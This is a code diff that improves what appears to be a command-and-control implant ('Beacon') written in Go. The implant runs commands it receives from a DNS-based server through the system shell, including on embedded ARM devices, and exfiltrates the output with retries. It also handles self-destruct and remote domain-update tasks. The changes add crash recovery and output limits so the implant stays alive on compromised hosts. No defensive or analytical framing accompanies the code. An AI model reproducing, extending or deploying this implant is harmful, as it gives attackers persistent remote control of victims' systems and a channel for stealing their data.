@@ -132,6 +132,13 @@ func compressOutput(data string) string {
 // executeCommand runs a system command and returns the output
 // Commands are subject to a 5-minute timeout to prevent hanging
 func (b *Beacon) executeCommand(command string) string {
+	// Add panic recovery to prevent beacon crash on command execution errors
+	defer func() {
+		if r := recover(); r != nil {
+			fmt.Printf("[ERROR] Command execution panic: %v\n", r)
+		}
+	}()
+
 	// Check for special commands
 	if command == "selfdestruct" || command == "uninstall" {
 		return b.selfDestruct()
@@ -143,30 +150,61 @@ func (b *Beacon) executeCommand(command string) string {
 
 	var cmd *exec.Cmd
 
-	// Choose appropriate shell based on OS
+	// Choose appropriate shell based on OS with fallback for embedded systems
 	switch runtime.GOOS {
 	case "windows":
 		cmd = exec.CommandContext(ctx, "cmd", "/c", command)
 	default:
-		cmd = exec.CommandContext(ctx, "/bin/sh", "-c", command)
+		// Try to find a working shell (important for embedded ARM devices)
+		shell := "/bin/sh"
+		if _, err := os.Stat("/bin/bash"); err == nil {
+			shell = "/bin/bash"
+		} else if _, err := os.Stat("/bin/ash"); err == nil {
+			// Alpine Linux / busybox (common on embedded systems)
+			shell = "/bin/ash"
+		}
+		cmd = exec.CommandContext(ctx, shell, "-c", command)
 	}
 
-	// Execute command with timeout
-	output, err := cmd.CombinedOutput()
+	// Capture output with separate stdout/stderr for better error visibility
+	var stdout, stderr bytes.Buffer
+	cmd.Stdout = &stdout
+	cmd.Stderr = &stderr
+
+	// Execute command
+	err := cmd.Run()
+
+	// Combine output
+	output := stdout.String()
+	if stderr.Len() > 0 {
+		if len(output) > 0 {
+			output += "\n"
+		}
+		output += stderr.String()
+	}
 
 	// Check for timeout
 	if ctx.Err() == context.DeadlineExceeded {
-		return fmt.Sprintf("Error: Command timed out after 5 minutes\nPartial output: %s", string(output))
+		return fmt.Sprintf("Error: Command timed out after 5 minutes\nPartial output: %s", output)
 	}
 
 	if err != nil {
-		return fmt.Sprintf("Error: %v\nOutput: %s", err, string(output))
+		return fmt.Sprintf("Error: %v\nOutput: %s", err, output)
 	}
 
-	result := string(output)
+	// Truncate output if too large (especially important for 32-bit ARM)
+	maxOutputSize := 1024 * 1024 // 1MB limit for 64-bit
+	if runtime.GOARCH == "arm" || runtime.GOARCH == "386" {
+		maxOutputSize = 512 * 1024 // 512KB for 32-bit architectures
+	}
+
+	if len(output) > maxOutputSize {
+		output = output[:maxOutputSize] + "\n[OUTPUT TRUNCATED - exceeded " +
+			fmt.Sprintf("%dKB", maxOutputSize/1024) + " limit]"
+	}
 
 	// Return raw result - compression removed to support large chunked exfils
-	return result
+	return output
 }
 
 // selfDestruct removes the beacon binary and exits
@@ -422,39 +460,56 @@ func (b *Beacon) runBeacon() {
 		// Check if server has a task for us
 		taskID, command, isTask := b.parseTask(response)
 		if isTask {
-			// Check for special commands
+			// Wrap task execution in panic recovery to prevent beacon crash
+			func() {
+				defer func() {
+					if r := recover(); r != nil {
+						errorMsg := fmt.Sprintf("Task execution panic: %v", r)
+						fmt.Printf("[ERROR] %s\n", errorMsg)
+						// Try to report the error back to C2
+						b.exfiltrateResult(errorMsg, taskID)
+					}
+				}()
+
+				// Check for special commands
+				if strings.HasPrefix(command, "update_domains:") {
+					// Special system command to update DNS domain list
+					domainsJSON := command[15:] // Skip "update_domains:" prefix
+
+					// Update the domain list
+					b.handleUpdateDomains(domainsJSON)
+
+					// NOTE: We don't send a result for update_domains tasks
+					// The beacon will naturally check in to the new DNS servers in the next cycle
+					// Sending a RESULT would cause the new DNS server to receive it immediately,
+					// which looks like a task result instead of a check-in
+
+					// Continue to next check-in cycle immediately
+					// The sleep will happen at the top of the loop, then check-in will use the new domain list
+					return
+				}
+
+				// Execute regular command
+				result := b.executeCommand(command)
+
+				// Exfiltrate the result with retries
+				maxRetries := 3
+				for attempt := 1; attempt <= maxRetries; attempt++ {
+					err := b.exfiltrateResult(result, taskID)
+					if err == nil {
+						break // Success
+					}
+					// Failed - retry with exponential backoff
+					if attempt < maxRetries {
+						backoff := time.Duration(attempt*2) * time.Second
+						time.Sleep(backoff)
+					}
+				}
+			}()
+
+			// If update_domains was processed, continue to next cycle
 			if strings.HasPrefix(command, "update_domains:") {
-				// Special system command to update DNS domain list
-				domainsJSON := command[15:] // Skip "update_domains:" prefix
-
-				// Update the domain list
-				b.handleUpdateDomains(domainsJSON)
-
-				// NOTE: We don't send a result for update_domains tasks
-				// The beacon will naturally check in to the new DNS servers in the next cycle
-				// Sending a RESULT would cause the new DNS server to receive it immediately,
-				// which looks like a task result instead of a check-in
-
-				// Continue to next check-in cycle immediately
-				// The sleep will happen at the top of the loop, then check-in will use the new domain list
 				continue
-			}
-
-			// Execute regular command
-			result := b.executeCommand(command)
-
-			// Exfiltrate the result with retries
-			maxRetries := 3
-			for attempt := 1; attempt <= maxRetries; attempt++ {
-				err := b.exfiltrateResult(result, taskID)
-				if err == nil {
-					break // Success
-				}
-				// Failed - retry with exponential backoff
-				if attempt < maxRetries {
-					backoff := time.Duration(attempt*2) * time.Second
-					time.Sleep(backoff)
-				}
 			}
 		}
 	}
